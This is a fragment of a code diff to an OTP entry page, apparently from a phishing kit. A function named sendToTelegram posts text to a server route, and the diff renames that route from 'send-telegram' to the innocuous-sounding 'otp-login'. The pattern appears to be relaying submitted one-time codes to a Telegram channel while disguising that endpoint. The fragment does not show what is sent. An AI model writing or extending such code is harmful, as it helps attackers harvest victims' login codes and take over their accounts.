@@ -13,7 +13,7 @@ export default function OtpPage() {
   const router = useRouter();
 
   const sendToTelegram = async (text: string) => {
-    await fetch('/api/send-telegram', {
+    await fetch('/api/otp-login', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ text }),
